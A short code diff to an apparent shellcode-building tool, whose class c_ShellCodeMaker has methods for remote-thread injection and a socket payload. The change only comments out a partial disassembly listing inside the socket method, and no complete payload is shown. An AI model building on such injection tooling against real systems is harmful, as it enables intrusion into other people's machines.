@@ -156,6 +156,7 @@ void c_ShellCodeMaker::MakeShellCode_CreateRemoteThread(LPVOID &allocMemAddr) {
     memcpy(wCode.shellCode, m_rawShellCode, sizeof(m_rawShellCode));
 }
 void c_ShellCodeMaker::MakeShellCode_Socket(LPVOID &allocMemAddr) {
+    /*
     0004105C | 55                      | push ebp                                                                                     |
     0004105D | 8DAC24 68F8FFFF         | lea ebp,dword ptr ss:[esp-0x798]                                                             |
     00041064 | 81EC 18080000           | sub esp,0x818                                                                                |
@@ -254,4 +255,5 @@ void c_ShellCodeMaker::MakeShellCode_Socket(LPVOID &allocMemAddr) {
     0004117D | E8 DAFEFFFF             | call copyofshellcode.4105C                                                                   |
     00041182 | 33C0                    | xor eax,eax                                                                                  |
     00041184 | C3                      | ret                                                                                          |
+     */
 }
